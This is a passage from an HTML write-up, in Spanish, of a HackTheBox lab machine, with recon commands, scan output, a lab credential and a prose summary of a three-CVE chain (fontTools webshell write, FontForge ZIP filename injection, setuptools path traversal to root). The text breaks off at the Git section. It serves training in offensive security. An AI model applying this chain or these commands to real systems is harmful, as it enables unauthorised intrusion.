@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VariaType — HTB Machine Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* ─── HERO ─── */
+.hero {
+  background: linear-gradient(135deg, var(--forest) 0%, var(--ink) 50%, #091a10 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(0,232,122,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0,232,122,0.03) 1px, transparent 1px);
+  background-size: 56px 56px;
+  pointer-events: none;
+}
+.hero-layout {
+  max-width: 1200px; margin: 0 auto;
+  display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: center;
+}
+@media(max-width: 900px) {
+  .hero-layout { grid-template-columns: 1fr; }
+  .hero-orb { order: -1; justify-self: center; }
+  .hero-meta { justify-content: center; }
+  .hero-sub { margin-left: auto; margin-right: auto; }
+  .hero-stats { justify-content: center; }
+}
+.hero-left { position: relative; z-index: 2; }
+.hero-brand {
+  font-family: var(--mo); font-size: 0.65rem;
+  color: rgba(0,232,122,0.45); letter-spacing: 0.2em; margin-bottom: 16px;
+  display: flex; align-items: center; gap: 8px;
+}
+.hero-brand-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  box-shadow: 0 0 10px var(--green); animation: hpd 1.2s infinite alternate;
+}
+@keyframes hpd { to { opacity: 0.2; transform: scale(0.5); } }
+.hero h1 {
+  font-family: var(--bb); font-size: clamp(2.4rem, 4vw, 3.5rem);
+  font-weight: 400; letter-spacing: 0.04em; margin-bottom: 14px; line-height: 1;
+  color: var(--text);
+}
+.hero h1 span { color: var(--green); }
+.hero-sub {
+  color: var(--text2); font-size: 0.95rem; max-width: 600px;
+  margin-bottom: 24px; line-height: 1.7; font-weight: 300;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 18px;
+}
+.tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 4px 12px; border-radius: 4px;
+  font-family: var(--mo);
+  font-size: 10px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase;
+}
+.tag-platform { background: rgba(0,232,122,0.1); color: var(--green); border: 1px solid rgba(0,232,122,0.25); }
+.tag-category { background: rgba(56,217,245,0.08); color: var(--cyan); border: 1px solid rgba(56,217,245,0.2); }
+.tag-diff { background: rgba(251,191,36,0.08); color: var(--yellow); border: 1px solid rgba(251,191,36,0.2); }
+.tag-os { background: rgba(167,139,250,0.08); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
+.hero-stats {
+  display: flex; gap: 28px; flex-wrap: wrap;
+}
+.stat { display: flex; flex-direction: column; gap: 2px; }
+.stat-label {
+  font-family: var(--mo);
+  font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3);
+}
+.stat-value { font-size: 1rem; font-weight: 700; color: var(--text); }
+.stat-value.green { color: var(--green); }
+
+/* Orb */
+.hero-orb { display: flex; align-items: center; justify-content: center; position: relative; }
+.orb-w { position: relative; width: 260px; height: 260px; }
+.orb-w .orb-el { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; }
+.orb-ring { position: absolute; border-radius: 50%; border: 1px solid; animation: ors linear infinite; }
+.orb-r1 { width: 260px; height: 260px; border-color: rgba(0,232,122,0.08); animation-duration: 30s; }
+.orb-r2 { width: 214px; height: 214px; border-color: rgba(0,232,122,0.12); animation-duration: 20s; animation-direction: reverse; border-style: dashed; }
+.orb-r3 { width: 172px; height: 172px; border-color: rgba(0,232,122,0.15); animation-duration: 15s; }
+@keyframes ors { to { transform: rotate(360deg); } }
+.orb-aura {
+  position: absolute; width: 200px; height: 200px; border-radius: 50%;
+  background: radial-gradient(circle, rgba(0,232,122,0.18) 0%, rgba(0,232,122,0.08) 35%, transparent 70%);
+  animation: oap 4s ease-in-out infinite;
+}
+@keyframes oap { 0%,100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
+.orb-core {
+  width: 130px; height: 130px; border-radius: 50%;
+  background: radial-gradient(circle at 38% 35%, rgba(0,232,122,0.35) 0%, rgba(15,48,32,0.8) 50%, rgba(11,26,16,0.95) 100%);
+  border: 1px solid rgba(0,232,122,0.3);
+  box-shadow: 0 0 60px rgba(0,232,122,0.2), 0 0 120px rgba(0,232,122,0.08), inset 0 0 40px rgba(0,232,122,0.1);
+  position: relative; z-index: 3; display: flex; align-items: center; justify-content: center; overflow: hidden;
+}
+.orb-core::before {
+  content: ''; position: absolute; top: 10%; left: 15%; width: 40%; height: 30%;
+  border-radius: 50%; background: rgba(255,255,255,0.12); filter: blur(8px);
+}
+.orb-rune {
+  font-family: var(--bb); font-size: 2.2rem; color: rgba(0,232,122,0.7);
+  text-shadow: 0 0 30px var(--green); position: relative; z-index: 2;
+  animation: org 3s ease-in-out infinite;
+}
+@keyframes org { 0%,100% { text-shadow: 0 0 20px var(--green), 0 0 40px rgba(0,232,122,0.4); } 50% { text-shadow: 0 0 40px var(--green), 0 0 80px rgba(0,232,122,0.6); } }
+.orb-scan {
+  position: absolute; left: 0; right: 0; height: 1.5px;
+  background: linear-gradient(90deg, transparent, rgba(0,232,122,0.5), transparent);
+  animation: osc 3s linear infinite; z-index: 4; pointer-events: none;
+}
+@keyframes osc { 0% { top: 5%; opacity: 0; } 10% { opacity: 0.8; } 90% { opacity: 0.5; } 100% { top: 95%; opacity: 0; } }
+.particle{position:absolute;width:3px;height:3px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pf linear infinite}
+.p1{top:15%;left:25%;animation-duration:6s}.p2{top:25%;right:18%;animation-duration:8s;animation-delay:-2s;width:4px;height:4px}.p3{bottom:20%;left:30%;animation-duration:7s;animation-delay:-4s}.p4{bottom:30%;right:25%;animation-duration:9s;animation-delay:-1s;opacity:.6}
+@keyframes pf{0%{transform:translateY(0) scale(1);opacity:1}33%{transform:translateY(-12px) translateX(8px) scale(1.3);opacity:.7}66%{transform:translateY(-6px) translateX(-10px) scale(.8);opacity:.9}100%{transform:translateY(0) scale(1);opacity:1}}
+
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}}
+
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);}
+.cmd-line{font-size:1rem;line-height:2;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.agent-panel{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;margin:1.5rem 0;}
+@media(max-width:700px){.agent-panel{grid-template-columns:1fr;}}
+.agent-card{background:var(--card2);border-radius:10px;padding:1rem;border:1px solid var(--border);}
+.agent-card.rto{border-top:3px solid var(--orange);}
+.agent-card.bta{border-top:3px solid var(--cyan);}
+.agent-card.bhm{border-top:3px solid var(--purple);}
+.agent-label{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.agent-card.rto .agent-label{color:var(--orange);}
+.agent-card.bta .agent-label{color:var(--cyan);}
+.agent-card.bhm .agent-label{color:var(--purple);}
+.agent-card p{font-size:.82rem;color:var(--text2);}
+.warning-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:8px;padding:1rem;display:flex;gap:1rem;align-items:flex-start;margin:1rem 0;}
+.warning-icon{font-size:1.5rem;flex-shrink:0;}
+.warning-card strong{color:var(--red);display:block;margin-bottom:.25rem;}
+.warning-card p{font-size:.85rem;color:var(--text2);}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
+
+/* Attack path */
+.attack-path{display:flex;align-items:center;flex-wrap:wrap;gap:8px;padding:1.25rem;background:var(--card);border:1px solid var(--border);border-radius:12px;margin:1.5rem 0;}
+.ap-node{background:var(--card2);border:1px solid var(--border);border-radius:6px;padding:8px 14px;font-size:13px;font-weight:600;color:var(--text);}
+.ap-node.start{border-color:var(--blue);color:var(--blue);}
+.ap-node.user{border-color:var(--green);color:var(--green);}
+.ap-node.root{border-color:var(--red);color:var(--red);}
+.ap-arrow{color:var(--text3);font-size:18px;}
+.ap-cve{font-size:11px;color:var(--orange);background:rgba(251,146,60,.1);border:1px solid rgba(251,146,60,.2);border-radius:4px;padding:2px 6px;font-weight:600;font-family:var(--mo);}
+
+/* CVE badge */
+.cve-badge{display:inline-block;background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.25);color:var(--red);font-size:12px;font-weight:700;padding:4px 10px;border-radius:4px;margin-bottom:16px;letter-spacing:0.5px;font-family:var(--mo);}
+
+/* ASCII diagram */
+.ascii-diagram{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1.25rem;font-family:var(--mo);font-size:.78rem;line-height:1.5;color:var(--text2);overflow-x:auto;margin:1rem 0;}
+.ascii-diagram .hl{color:var(--blue);}
+.ascii-diagram .hl-red{color:var(--red);}
+.ascii-diagram .hl-green{color:var(--green);}
+.ascii-diagram .hl-orange{color:var(--orange);}
+
+/* Timeline */
+.timeline{position:relative;padding-left:40px;}
+.timeline::before{content:'';position:absolute;left:15px;top:0;bottom:0;width:2px;background:linear-gradient(to bottom,var(--blue),var(--green),var(--orange),var(--red),var(--purple));}
+.tl-item{position:relative;margin-bottom:1.5rem;background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
+.tl-item::before{content:'';position:absolute;left:-32px;top:20px;width:12px;height:12px;border-radius:50%;background:var(--blue);border:2px solid var(--ink);}
+.tl-item:nth-child(2)::before{background:var(--cyan);}
+.tl-item:nth-child(3)::before{background:var(--green);}
+.tl-item:nth-child(4)::before{background:var(--orange);}
+.tl-item:nth-child(5)::before{background:var(--red);}
+.tl-item:nth-child(6)::before{background:var(--purple);}
+.tl-step{font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);margin-bottom:4px;font-family:var(--mo);}
+.tl-title{font-size:1rem;font-weight:700;color:var(--text);margin-bottom:6px;}
+.tl-desc{color:var(--text2);font-size:.85rem;margin:0;}
+.tl-arrow{display:inline-block;background:rgba(0,232,122,.1);border:1px solid rgba(0,232,122,.2);color:var(--green);font-size:11px;font-weight:600;padding:2px 8px;border-radius:4px;margin-top:8px;font-family:var(--mo);}
+
+/* Glossary */
+.glossary-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1rem;margin-top:1.5rem;}
+.glossary-card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1rem;}
+.glossary-card .term{font-family:var(--mo);font-size:.82rem;font-weight:700;color:var(--cyan);margin-bottom:4px;}
+.glossary-card .def{font-size:.82rem;color:var(--text2);line-height:1.5;}
+
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.8rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.cred-tag{display:inline-block;background:rgba(248,113,113,.08);color:var(--red);border:1px solid rgba(248,113,113,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.tool-list{display:flex;flex-wrap:wrap;gap:.4rem;}
+.tool-tag{background:rgba(0,232,122,.06);color:var(--green);border:1px solid rgba(0,232,122,.15);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);}
+.toc-link{display:block;font-size:.8rem;color:var(--text2);padding:.3rem 0;border-bottom:1px solid var(--border);text-decoration:none;}
+.toc-link:hover{color:var(--green);}
+.toc-link:last-child{border-bottom:none;}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;}
+
+/* Section header with number */
+.section-header{display:flex;align-items:center;gap:12px;margin-bottom:1.5rem;}
+.section-num{width:36px;height:36px;background:var(--green);color:var(--ink);font-size:14px;font-weight:800;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-family:var(--bb);}
+.section-num.red{background:var(--red);color:#fff;}
+.section-num.orange{background:var(--orange);color:var(--ink);}
+.section-num.purple{background:var(--purple);color:var(--ink);}
+</style>
+</head>
+<body>
+
+<!-- ═══ HERO ═══ -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">HackTheBox</span>
+        <span class="tag tag-category">Machine</span>
+        <span class="tag tag-diff">Medium</span>
+        <span class="tag tag-os">Linux</span>
+      </div>
+      <h1><span>VariaType</span> — Font Supply Chain RCE</h1>
+      <p class="hero-sub">Cadena de compromiso que encadena tres CVEs: lectura de repositorio Git expuesto para extraer credenciales, escritura arbitraria de archivos vía fontTools varLib (CVE-2025-66034) para obtener RCE como www-data, inyección de comandos en FontForge via ZIP filename injection (CVE-2024-25081) para escalar a steve, y path traversal en setuptools (CVE-2025-47273) combinado con sudo misconfiguration para obtener root.</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Target</span><span class="stat-value green">10.129.7.218</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Linux</span></div>
+        <div class="stat"><span class="stat-label">Puertos</span><span class="stat-value">22 · 80</span></div>
+        <div class="stat"><span class="stat-label">CVEs</span><span class="stat-value">3</span></div>
+        <div class="stat"><span class="stat-label">Flags</span><span class="stat-value">2/2</span></div>
+      </div>
+    </div>
+    <!-- Orb -->
+    <div class="hero-orb">
+      <div class="orb-w">
+        <div class="orb-el">
+          <div class="orb-ring orb-r1"></div>
+          <div class="orb-ring orb-r2"></div>
+          <div class="orb-ring orb-r3"></div>
+          <div class="orb-aura"></div>
+          <div class="orb-core"><span class="orb-rune">ᚺ</span></div>
+          <div class="orb-scan"></div>
+          <div class="particle p1"></div>
+          <div class="particle p2"></div>
+          <div class="particle p3"></div>
+          <div class="particle p4"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+<main>
+
+<!-- RESUMEN -->
+<div class="section" id="resumen">
+  <h2>Resumen Ejecutivo</h2>
+  <div class="info-box">
+    <p>La máquina <strong>VariaType</strong> expone una aplicación web de generación de fuentes tipográficas variables. La cadena de compromiso completo requirió explotar tres vulnerabilidades encadenadas: una lectura arbitraria de repositorio Git expuesto para extraer credenciales, una escritura arbitraria de archivos a través de una vulnerabilidad en fontTools (CVE-2025-66034) para obtener ejecución de código como <code>www-data</code>, una inyección de comandos en nombres de archivo ZIP procesados por FontForge (CVE-2024-25081) para escalar a <code>steve</code>, y finalmente un path traversal en setuptools (CVE-2025-47273) combinado con un sudo misconfiguration para obtener acceso como <code>root</code>.</p>
+  </div>
+
+  <div class="attack-path">
+    <div class="ap-node start">Attacker</div>
+    <span class="ap-arrow">→</span>
+    <div class="ap-node">Git Exposed<br><small style="color:var(--text3);font-size:11px">gitbot creds</small></div>
+    <span class="ap-arrow">→</span>
+    <div>
+      <div class="ap-cve">CVE-2025-66034</div>
+      <div class="ap-node">www-data<br><small style="color:var(--text3);font-size:11px">fontTools RCE</small></div>
+    </div>
+    <span class="ap-arrow">→</span>
+    <div>
+      <div class="ap-cve">CVE-2024-25081</div>
+      <div class="ap-node user">steve<br><small style="color:var(--text3);font-size:11px">FontForge ZIP</small></div>
+    </div>
+    <span class="ap-arrow">→</span>
+    <div>
+      <div class="ap-cve">CVE-2025-47273</div>
+      <div class="ap-node root">root<br><small style="color:var(--text3);font-size:11px">setuptools</small></div>
+    </div>
+  </div>
+
+  <table class="data-table">
+    <thead><tr><th>Paso</th><th>Técnica</th><th>Resultado</th><th>Severidad</th></tr></thead>
+    <tbody>
+      <tr><td>01</td><td>Port Scan + VHost Enumeration</td><td>Descubrimiento de superficie</td><td style="color:var(--text3)">Info</td></tr>
+      <tr><td>02</td><td>Git Repository Exposed + git-dumper</td><td>Credenciales gitbot</td><td style="color:var(--orange)">High</td></tr>
+      <tr><td>03</td><td>Autenticación con credenciales</td><td>Acceso al portal PHP</td><td style="color:var(--orange)">High</td></tr>
+      <tr><td>04</td><td>CVE-2025-66034 fontTools path traversal</td><td>RCE como www-data</td><td style="color:var(--red)">Critical</td></tr>
+      <tr><td>05</td><td>CVE-2024-25081 FontForge ZIP injection</td><td>Shell como steve + user.txt</td><td style="color:var(--red)">Critical</td></tr>
+      <tr><td>06</td><td>CVE-2025-47273 setuptools + sudo</td><td>Shell como root + root.txt</td><td style="color:var(--red)">Critical</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- TIMELINE -->
+<div class="section" id="timeline">
+  <div class="section-header">
+    <div class="section-num purple">▶</div>
+    <h2>Timeline de Ataque</h2>
+  </div>
+
+  <div class="timeline">
+    <div class="tl-item">
+      <div class="tl-step">Paso 01 · Reconocimiento</div>
+      <div class="tl-title">Escaneo de puertos y enumeración de virtual hosts</div>
+      <p class="tl-desc">nmap revela SSH (22) y HTTP (80). ffuf/gobuster descubren variatype.htb (Flask) y portal.variatype.htb (PHP).</p>
+      <span class="tl-arrow">→ Superficie de ataque identificada</span>
+    </div>
+    <div class="tl-item">
+      <div class="tl-step">Paso 02 · Git Exposed</div>
+      <div class="tl-title">Repositorio .git accesible públicamente</div>
+      <p class="tl-desc">git-dumper descarga el repo. Un commit eliminado contiene credenciales hardcodeadas: <code>gitbot:G1tB0t_Acc3ss_2025!</code></p>
+      <span class="tl-arrow">→ Credenciales recuperadas</span>
+    </div>
+    <div class="tl-item">
+      <div class="tl-step">Paso 03 · Autenticación</div>
+      <div class="tl-title">Login en portal.variatype.htb</div>
+      <p class="tl-desc">Las credenciales son válidas. El dashboard muestra una herramienta de generación de fuentes variables.</p>
+      <span class="tl-arrow">→ Acceso al portal interno</span>
+    </div>
+    <div class="tl-item">
+      <div class="tl-step">Paso 04 · CVE-2025-66034</div>
+      <div class="tl-title">fontTools varLib — Arbitrary File Write → RCE</div>
+      <p class="tl-desc">El servidor procesa archivos .designspace sin sanitizar el atributo filename. Se escribe una webshell PHP en la raíz del portal.</p>
+      <span class="tl-arrow">→ RCE como www-data</span>
+    </div>
+    <div class="tl-item">
+      <div class="tl-step">Paso 05 · CVE-2024-25081</div>
+      <div class="tl-title">FontForge ZIP Filename Injection → steve</div>
+      <p class="tl-desc">Un script cron ejecutado por steve procesa ZIPs con FontForge. El nombre de archivo interno contiene bash command substitution que inyecta una clave SSH pública.</p>
+      <span class="tl-arrow">→ SSH como steve + user.txt</span>
+    </div>
+    <div class="tl-item">
+      <div class="tl-step">Paso 06 · CVE-2025-47273</div>
+      <div class="tl-title">setuptools PackageIndex Path Traversal → root</div>
+      <p class="tl-desc">steve puede ejecutar un validador con sudo. setuptools decodifica %2F en URLs como separadores de path, escribiendo contenido arbitrario en /root/.ssh/authorized_keys.</p>
+      <span class="tl-arrow">→ SSH como root + root.txt</span>
+    </div>
+  </div>
+</div>
+
+<!-- PASO 01 - RECON -->
+<div class="section" id="recon">
+  <div class="section-header">
+    <div class="section-num">01</div>
+    <h2>Reconocimiento</h2>
+  </div>
+
+  <div class="why-box">
+    <strong>¿Qué es este paso?</strong>
+    <p>El reconocimiento es la fase inicial donde recolectamos información sobre el objetivo sin modificar su estado. Identificamos qué servicios están activos, qué tecnologías usa y qué subdominios existen.</p>
+  </div>
+
+  <h3>1.1 — Escaneo de puertos con nmap</h3>
+
+  <div class="why-box">
+    <strong>¿Por qué nmap aquí?</strong>
+    <p>nmap es el estándar de facto para descubrir puertos abiertos y versiones de servicios. Con <code>-sV</code> obtenemos las versiones exactas, lo que permite buscar CVEs asociados.</p>
+  </div>
+
+  <div class="cmd-annotated">
+    <div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-sC -sV -p- --min-rate 5000</span> <span class="flag-opt">-oN</span> <span class="param">nmap_full.txt</span> <span class="ip">10.129.7.218</span></div>
+  </div>
+
+  <div class="output-box">
+    <div class="output-label">Output</div>
+    <pre>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
+| ssh-hostkey:
+|   256 5d:b8:56:af:37:94:7a:e8:4a:5d:a9:bc:24:6f:07:5a (ECDSA)
+|_  256 98:0a:ce:9d:23:4e:68:13:0c:c7:f4:5f:e1:f7:6e:c7 (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-title: VariaType — Variable Font Studio
+|_http-server-header: nginx/1.22.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
+  </div>
+
+  <div class="interpret-box">
+    <strong>Interpretación</strong>
+    <p>Superficie mínima: solo SSH y HTTP. OpenSSH 9.2p1 es reciente, sin CVEs críticos conocidos. El vector de ataque será la aplicación web en el puerto 80. nginx como proxy inverso sugiere múltiples aplicaciones detrás.</p>
+  </div>
+
+  <h3>1.2 — Enumeración de Virtual Hosts</h3>
+
+  <div class="why-box">
+    <strong>¿Qué son los virtual hosts y por qué enumerarlos?</strong>
+    <p>Un servidor web puede alojar múltiples aplicaciones en la misma IP, diferenciadas por el header HTTP <code>Host</code>. La enumeración de VHosts puede revelar paneles de administración, APIs o aplicaciones de desarrollo no publicadas.</p>
+  </div>
+
+  <div class="cmd-annotated">
+    <div class="cmd-line"><span class="cmd">echo</span> <span class="param">"10.129.7.218  variatype.htb"</span> | <span class="cmd">sudo tee -a</span> <span class="param">/etc/hosts</span></div>
+    <div class="cmd-line" style="margin-top:.5rem"><span class="cmd">ffuf</span> <span class="flag-opt">-w</span> <span class="param">/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span> <span class="flag-opt">-u</span> <span class="param">http://variatype.htb/</span> <span class="flag-opt">-H</span> <span class="param">"Host: FUZZ.variatype.htb"</span> <span class="flag-opt">-fs 0 -fc 302 -mc all</span></div>
+  </div>
+
+  <div class="output-box">
+    <div class="output-label">Output</div>
+    <pre>portal                  [Status: 200, Size: 4821, Words: 312]
+:: Progress: [4989/4989] :: Job :: Time: 00:00:14 :: 4989 req/s</pre>
+  </div>
+
+  <div class="interpret-box">
+    <strong>Interpretación y decisión</strong>
+    <p>Se descubre <strong>portal.variatype.htb</strong>. Responde con un portal PHP de login — aplicación diferente a la Flask principal.</p>
+  </div>
+
+  <div class="cmd-annotated">
+    <div class="cmd-line"><span class="cmd">gobuster dir</span> <span class="flag-opt">-u</span> <span class="param">http://portal.variatype.htb/</span> <span class="flag-opt">-w</span> <span class="param">/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt</span> <span class="flag-opt">-x php,html,txt -t 50</span></div>
+  </div>
+
+  <div class="output-box">
+    <div class="output-label">Output</div>
+    <pre>/.git/HEAD            (Status: 200) [Size: 23]
+/index.php            (Status: 200) [Size: 4821]
+/dashboard.php        (Status: 302) [→ /index.php]
+/auth.php             (Status: 403) [Size: 162]
+/config.php           (Status: 403) [Size: 162]
+/public/              (Status: 200) [Size: 1204]</pre>
+  </div>
+
+  <div class="interpret-box">
+    <strong>Interpretación</strong>
+    <p><strong>Hallazgo crítico:</strong> <code>/.git/HEAD</code> responde con HTTP 200. El directorio <code>.git</code> está expuesto públicamente, permitiendo descargar todo el historial del repositorio.</p>
+  </div>
+</div>
+
+<!-- PASO 02 - GIT EXPOSED -->
+<div class="section" id="git">
+  <div class="section-header">
+    <div class="section-num">02</div>
+    <h2>Git Repository Exposed</h2>
+  </div>
+
+  <div class="info-box">
